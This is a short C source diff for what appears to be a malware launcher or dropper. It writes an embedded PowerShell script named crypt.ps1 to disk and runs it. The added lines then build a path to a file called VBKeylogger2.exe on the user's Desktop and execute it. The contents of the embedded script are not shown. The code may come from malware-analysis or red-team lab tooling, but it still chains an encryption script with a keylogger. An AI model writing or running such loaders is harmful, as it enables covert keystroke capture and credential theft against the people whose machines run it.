@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include "helpers.h"
 #include "script-constants/script-constants.h"
 
@@ -13,7 +14,15 @@ void WriteString(const char *filepath, const char *string)
 }
 
 int main() {
-    char *cryptFilename = "crypt.ps1";
+    char *cryptFilename = ".\\crypt.ps1";
     WriteString(cryptFilename, cryptScript);
-    return RunPowerShellScript(cryptFilename);
+    int returnVal = RunPowerShellScript(cryptFilename);
+    if (returnVal == 1) {
+        return 1;
+    }
+    const size_t bufferLen = 200;
+    char samplePath[bufferLen];
+    char *userProfilePath = getenv("UserProfile");
+    snprintf(samplePath, bufferLen, "%s\\Desktop\\VBKeylogger2.exe", userProfilePath);
+    return RunCommand(samplePath);
 }
